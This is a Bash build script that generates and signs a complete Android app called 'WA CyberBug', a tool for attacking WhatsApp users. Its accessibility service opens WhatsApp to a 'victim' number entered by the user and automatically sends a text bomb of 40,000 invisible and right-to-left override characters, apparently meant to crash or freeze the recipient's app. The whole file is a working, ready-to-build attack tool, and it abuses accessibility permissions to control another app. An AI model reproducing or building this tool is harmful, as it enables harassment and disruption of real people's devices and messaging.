#!/usr/bin/env bash
# language: Bash, file: build.sh
set -Eeuo pipefail

ROOT="$(pwd)/wa-bugger-modern"
PKG="com.js.wabugger"
PKG_DIR="$ROOT/app/src/main/java/com/js/wabugger"
RES_DIR="$ROOT/app/src/main/res"

mkdir -p "$PKG_DIR" "$RES_DIR/values" "$RES_DIR/layout" "$RES_DIR/xml" "$RES_DIR/drawable"
cd "$ROOT"

# --- Gradle Setup ---
cat > settings.gradle.kts <<'EOF'
pluginManagement { repositories { google(); mavenCentral(); gradlePluginPortal() } }
dependencyResolutionManagement { repositories { google(); mavenCentral() } }
rootProject.name = "wa-bugger"
include(":app")
EOF

cat > build.gradle.kts <<'EOF'
plugins {
    id("com.android.application") version "8.5.2" apply false
    id("org.jetbrains.kotlin.android") version "1.9.24" apply false
}
EOF

cat > app/build.gradle.kts <<'EOF'
plugins {
    id("com.android.application")
    id("org.jetbrains.kotlin.android")
}
android {
    namespace = "com.js.wabugger"
    compileSdk = 34
    defaultConfig {
        applicationId = "com.js.wabugger"
        minSdk = 26
        targetSdk = 34
        versionCode = 1
        versionName = "2.0"
    }
    buildTypes { release { isMinifyEnabled = false } }
    compileOptions {
        sourceCompatibility = JavaVersion.VERSION_17
        targetCompatibility = JavaVersion.VERSION_17
    }
    kotlinOptions { jvmTarget = "17" }
}
dependencies {
    implementation("androidx.core:core-ktx:1.13.1")
    implementation("androidx.appcompat:appcompat:1.7.0")
    implementation("com.google.android.material:material:1.12.0")
    implementation("androidx.cardview:cardview:1.0.0")
}
EOF

# --- Manifest ---
cat > app/src/main/AndroidManifest.xml <<'EOF'
<manifest xmlns:android="http://schemas.android.com/apk/res/android">
    <application
        android:allowBackup="false"
        android:label="WA CyberBug"
        android:theme="@style/Theme.Material.NoActionBar"
        android:icon="@android:drawable/ic_dialog_alert">
        
        <activity android:name=".MainActivity" android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
        
        <service
            android:name=".WaBugService"
            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
            android:exported="true">
            <intent-filter>
                <action android:name="android.accessibilityservice.AccessibilityService" />
            </intent-filter>
            <meta-data
                android:name="android.accessibilityservice"
                android:resource="@xml/accessibility_config" />
        </service>
    </application>
</manifest>
EOF

cat > "$RES_DIR/xml/accessibility_config.xml" <<'EOF'
<accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
    android:accessibilityEventTypes="typeWindowStateChanged"
    android:accessibilityFeedbackType="feedbackGeneric"
    android:accessibilityFlags="flagDefault"
    android:canRetrieveWindowContent="true"
    android:description="@string/app_name" />
EOF

cat > "$RES_DIR/values/strings.xml" <<'EOF'
<resources><string name="app_name">WA CyberBug</string></resources>
EOF

# --- Drawable (Neon Glow) ---
cat > "$RES_DIR/drawable/neon_bg.xml" <<'EOF'
<shape xmlns:android="http://schemas.android.com/apk/res/android">
    <solid android:color="#05020A"/>
    <stroke android:width="2dp" android:color="#FF0055"/>
    <corners android:radius="16dp"/>
</shape>
EOF

# --- UI Layout (Modern Cyberpunk) ---
cat > "$RES_DIR/layout/activity_main.xml" <<'EOF'
<?xml version="1.0" encoding="utf-8"?>
<ScrollView xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:background="#05020A"
    android:fillViewport="true">

    <LinearLayout
        android:layout_width="match_parent"
        android:layout_height="wrap_content"
        android:orientation="vertical"
        android:padding="24dp"
        android:gravity="center_horizontal">

        <!-- Header -->
        <TextView
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:text="⚡ WA CYBER BUG ⚡"
            android:textColor="#00FFCC"
            android:textSize="28sp"
            android:textStyle="bold"
            android:fontFamily="monospace"
            android:layout_marginTop="30dp"
            android:layout_marginBottom="8dp"/>

        <TextView
            android:layout_width="wrap_content"
            android:layout_height="wrap_content"
            android:text="ADVANCED PAYLOAD INJECTOR"
            android:textColor="#FF0055"
            android:textSize="12sp"
            android:letterSpacing="0.2"
            android:fontFamily="monospace"
            android:layout_marginBottom="40dp"/>

        <!-- Card Sender -->
        <androidx.cardview.widget.CardView
            android:layout_width="match_parent"
            android:layout_height="wrap_content"
            app:cardBackgroundColor="#1A1A24"
            app:cardCornerRadius="12dp"
            app:cardElevation="8dp"
            android:layout_marginBottom="16dp"
            xmlns:app="http://schemas.android.com/apk/res-auto">
            
            <LinearLayout
                android:layout_width="match_parent"
                android:layout_height="wrap_content"
                android:orientation="vertical"
                android:padding="16dp">
                
                <TextView
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:text="Nomor Pengirim (Login di HP ini)"
                    android:textColor="#00FFCC"
                    android:textSize="12sp"
                    android:fontFamily="monospace"/>
                
                <EditText
                    android:id="@+id/etSender"
                    android:layout_width="match_parent"
                    android:layout_height="wrap_content"
                    android:hint="62812xxxx"
                    android:textColor="#FFFFFF"
                    android:textColorHint="#555555"
                    android:backgroundTint="#00FFCC"
                    android:inputType="phone"
                    android:fontFamily="monospace"
                    android:paddingTop="12dp"/>
            </LinearLayout>
        </androidx.cardview.widget.CardView>

        <!-- Card Target -->
        <androidx.cardview.widget.CardView
            android:layout_width="match_parent"
            android:layout_height="wrap_content"
            app:cardBackgroundColor="#1A1A24"
            app:cardCornerRadius="12dp"
            app:cardElevation="8dp"
            android:layout_marginBottom="32dp"
            xmlns:app="http://schemas.android.com/apk/res-auto">
            
            <LinearLayout
                android:layout_width="match_parent"
                android:layout_height="wrap_content"
                android:orientation="vertical"
                android:padding="16dp">
                
                <TextView
                    android:layout_width="wrap_content"
                    android:layout_height="wrap_content"
                    android:text="Nomor Korban (Target)"
                    android:textColor="#FF0055"
                    android:textSize="12sp"
                    android:fontFamily="monospace"/>
                
                <EditText
                    android:id="@+id/etTarget"
                    android:layout_width="match_parent"
                    android:layout_height="wrap_content"
                    android:hint="62899xxxx"
                    android:textColor="#FFFFFF"
                    android:textColorHint="#555555"
                    android:backgroundTint="#FF0055"
                    android:inputType="phone"
                    android:fontFamily="monospace"
                    android:paddingTop="12dp"/>
            </LinearLayout>
        </androidx.cardview.widget.CardView>

        <!-- Permission Button -->
        <Button
            android:id="@+id/btnPermission"
            android:layout_width="match_parent"
            android:layout_height="50dp"
            android:text="1. IZINKAN AKSESIBILITAS"
            android:backgroundTint="#1A1A24"
            android:textColor="#00FFCC"
            android:layout_marginBottom="16dp"/>

        <!-- Attack Button -->
        <Button
            android:id="@+id/btnStart"
            android:layout_width="match_parent"
            android:layout_height="70dp"
            android:text="🚀 LAUNCH ATTACK"
            android:backgroundTint="#FF0055"
            android:textColor="#FFFFFF"
            android:textSize="18sp"
            android:textStyle="bold"
            android:fontFamily="monospace"
            android:layout_marginBottom="24dp"/>

        <TextView
            android:id="@+id/tvStatus"
            android:layout_width="match_parent"
            android:layout_height="wrap_content"
            android:text="[ SYSTEM READY ]"
            android:textColor="#00FFCC"
            android:fontFamily="monospace"
            android:textSize="12sp"
            android:gravity="center"/>

    </LinearLayout>
</ScrollView>
EOF

# --- MainActivity ---
cat > "$PKG_DIR/MainActivity.kt" <<'EOF'
package com.js.wabugger

import android.content.Intent
import android.os.Bundle
import android.provider.Settings
import android.widget.*
import androidx.appcompat.app.AppCompatActivity

class MainActivity : AppCompatActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        val btnPermission = findViewById<Button>(R.id.btnPermission)
        val btnStart = findViewById<Button>(R.id.btnStart)
        val etSender = findViewById<EditText>(R.id.etSender)
        val etTarget = findViewById<EditText>(R.id.etTarget)
        val tvStatus = findViewById<TextView>(R.id.tvStatus)

        btnPermission.setOnClickListener {
            tvStatus.text = "[ WAITING FOR PERMISSION ]"
            startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
        }

        btnStart.setOnClickListener {
            val sender = etSender.text.toString().trim()
            val target = etTarget.text.toString().trim()

            if (sender.isEmpty() || target.isEmpty()) {
                Toast.makeText(this, "Isi kedua nomor!", Toast.LENGTH_SHORT).show()
                return@setOnClickListener
            }

            tvStatus.text = "[ INJECTING PAYLOAD TO $target... ]"
            
            val cleanTarget = target.replace("[^0-9]".toRegex(), "")
            val finalTarget = if (cleanTarget.startsWith("0")) "62" + cleanTarget.substring(1) else cleanTarget

            WaBugService.targetNumber = finalTarget
            WaBugService.isBombing = true

            // Buka WA ke nomor target
            val url = "https://api.whatsapp.com/send?phone=$finalTarget"
            val intent = Intent(Intent.ACTION_VIEW, android.net.Uri.parse(url))
            intent.setPackage("com.whatsapp")
            
            try {
                startActivity(intent)
            } catch (e: Exception) {
                Toast.makeText(this, "WhatsApp tidak terinstall!", Toast.LENGTH_SHORT).show()
                WaBugService.isBombing = false
            }
        }
    }
}
EOF

# --- WaBugService ---
cat > "$PKG_DIR/WaBugService.kt" <<'EOF'
package com.js.wabugger

import android.accessibilityservice.AccessibilityService
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import android.widget.Toast

class WaBugService : AccessibilityService() {
    companion object {
        var isBombing = false
        var targetNumber = ""
    }

    private val handler = Handler(Looper.getMainLooper())

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (!isBombing) return
        if (event?.eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
            val packageName = event.packageName?.toString() ?: ""
            
            if (packageName == "com.whatsapp") {
                handler.postDelayed({
                    val root = rootInActiveWindow
                    if (root != null) {
                        val editTexts = root.findAccessibilityNodeInfosByViewId("com.whatsapp:id/entry")
                        
                        if (editTexts != null && editTexts.isNotEmpty()) {
                            val editText = editTexts[0]
                            
                            // Payload Text Bomb
                            val payload = "\u202E".repeat(20000) + "\u200B".repeat(20000) + "\n\n💀 CYBER ATTACK 💀"

                            val arguments = Bundle()
                            arguments.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, payload)
                            editText.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, arguments)
                            
                            handler.postDelayed({
                                val sendButtons = root.findAccessibilityNodeInfosByViewId("com.whatsapp:id/send")
                                if (sendButtons != null && sendButtons.isNotEmpty()) {
                                    sendButtons[0].performAction(AccessibilityNodeInfo.ACTION_CLICK)
                                    Toast.makeText(this, "PAYLOAD DELIVERED!", Toast.LENGTH_SHORT).show()
                                    
                                    handler.postDelayed({
                                        performGlobalAction(GLOBAL_ACTION_HOME)
                                        isBombing = false
                                    }, 1500)
                                }
                            }, 1000)
                        }
                    }
                }, 2000)
            }
        }
    }
    override fun onInterrupt() {}
}
EOF

# --- Build & Sign ---
gradle wrapper --gradle-version 8.7 --distribution-type bin >/dev/null 2>&1 || true
if [[ -x ./gradlew ]]; then ./gradlew assembleRelease --no-daemon; else gradle assembleRelease --no-daemon; fi

APK_REL="$ROOT/app/build/outputs/apk/release/app-release-unsigned.apk"
APK_SIG="$ROOT/app/build/outputs/apk/release/app-release-signed.apk"
KEYSTORE="${HOME}/.android/debug.keystore"
[[ -f "$KEYSTORE" ]] || {
  mkdir -p "$(dirname "$KEYSTORE")"
  keytool -genkeypair -v -keystore "$KEYSTORE" -keyalg RSA -keysize 2048 -validity 10000 \
    -alias androiddebugkey -storepass android -keypass android -dname "CN=Android Debug,O=Android,C=US" >/dev/null 2>&1
}
BT="${ANDROID_HOME:-/opt/android-sdk}/build-tools/34.0.0"
if [[ -f "$APK_REL" ]]; then
  "$BT/apksigner" sign --ks "$KEYSTORE" --ks-pass pass:android --key-pass pass:android \
    --ks-key-alias androiddebugkey --out "$APK_SIG" "$APK_REL"
  echo "SUKSES: $APK_SIG"
fi
